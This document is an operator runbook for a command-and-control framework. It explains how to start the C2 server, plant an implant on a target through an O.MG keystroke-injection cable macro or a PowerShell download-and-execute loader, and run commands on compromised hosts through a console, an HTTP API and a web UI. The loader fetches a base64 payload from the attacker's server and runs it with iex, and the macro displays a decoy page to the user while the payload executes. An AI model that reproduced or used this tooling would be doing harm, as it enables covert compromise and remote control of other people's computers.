# Runbook

End-to-end: start server, get a session, run commands.

## 1. Build and start the server

```bash
cd DreadPirateRoberts/c2
./build.sh
cd server
./c2server
```

Server listens on port 8443 (TLS). You’ll see:

- `GET /sync  GET /view  WS /live  GET/POST /op/sessions, /op/exec`
- `Operator: list | use <id> | exec <cmd> | exit`
- Prompt `> `

## 2. Optional: config.json (server directory)

Create or edit `server/config.json`:

- **sync_token** – If set, GET /sync only returns the payload when the request includes `?k=<sync_token>`. Use this in your macro URL: `https://HOSTPORT/sync?k=YOUR_TOKEN`.
- **op_token** – If set, GET /op/sessions and POST /op/exec require header `X-Op-Token: <op_token>` or query `?k=<op_token>`.

Example:

```json
{
  "port": 8443,
  "sync_token": "your-secret-sync-key",
  "op_token": "your-operator-key"
}
```

## 3. Get a session (implant)

**Option A: Macro (O.MG cable)**  
In `macros/sync.txt` or `sync-and-view.txt`, replace `HOSTPORT` with your server (e.g. `192.168.1.100:8443`). If you set `sync_token`, use:

`https://HOSTPORT/sync?k=YOUR_TOKEN`

in the loader one-liner (and in the macro STRING). Flash the macro to the cable and run it on the target (authorized only).

**Option B: Go client (testing)**  
On another machine (or same):

```bash
cd client
# Edit config.json: server_url = wss://YOUR_SERVER:8443/live
./client
```

**Option C: PowerShell (testing)**  
On a Windows box, run the loader (replace HOSTPORT and add `?k=TOKEN` if you use sync_token):

```powershell
$b=(New-Object Net.WebClient).DownloadString('https://HOSTPORT/sync')
iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
```

When the implant connects, the server logs: `session xxxxxxxx connected`.

## 4. Operator: list, use, exec (stdin)

With the server running in the foreground:

- **list** – List session IDs and addresses.
- **use** \<id\> – Select a session (use the 8-char id from list).
- **exec** \<cmd\> – Run the command on the selected session; output prints when the client responds.
- **exit** – Quit the REPL (server keeps running).

Example:

```
> list
  a1b2c3d4  192.168.1.50:54321
> use a1b2c3d4
selected a1b2c3d4
> exec whoami
sent xyz
[a1b2c3d4] xyz: desktop-abc\user
>
```

## 5. Operator: HTTP API (no TTY)

When the server runs in the background or on a VPS, use the API (HTTPS, same port).

**List sessions**

```bash
curl -k https://localhost:8443/op/sessions
# If op_token set:
curl -k -H "X-Op-Token: YOUR_OP_TOKEN" https://localhost:8443/op/sessions
```

Response: `[{"id":"a1b2c3d4","addr":"192.168.1.50:54321"}]`

**Run command**

```bash
curl -k -X POST https://localhost:8443/op/exec \
  -H "Content-Type: application/json" \
  -d '{"session_id":"a1b2c3d4","command":"whoami"}'
# If op_token set, add: -H "X-Op-Token: YOUR_OP_TOKEN"
```

Response: `{"session_id":"a1b2c3d4","command_id":"...","status":"success","output":"desktop-abc\\user","error":""}`

The request blocks until the client responds or 90s timeout.

## 6. View page

Open in a browser (ignore self-signed cert warning in lab):

`https://HOSTPORT/view`

Used by the macro `sync-and-view.txt` so the user sees the view page while the script runs.

## 7. Web UI (optional)

Build and serve the React UI, pointing it at the server:

```bash
cd web-ui
REACT_APP_API_URL=https://localhost:8443 npm start
# If server has op_token: REACT_APP_OP_TOKEN=your-key
```

Open http://localhost:3000. **Clients** lists sessions (from GET /op/sessions). **Console** lets you pick a session and run commands (POST /op/exec). See `web-ui/WEB_UI_API.md` for API details.

## Quick reference

| Item        | Value                          |
|------------|---------------------------------|
| Sync URL   | `https://HOST:8443/sync` or `.../sync?k=TOKEN` |
| View URL   | `https://HOST:8443/view`        |
| WebSocket  | `wss://HOST:8443/live`          |
| List API   | `GET /op/sessions`              |
| Exec API   | `POST /op/exec` body `{"session_id","command"}` |
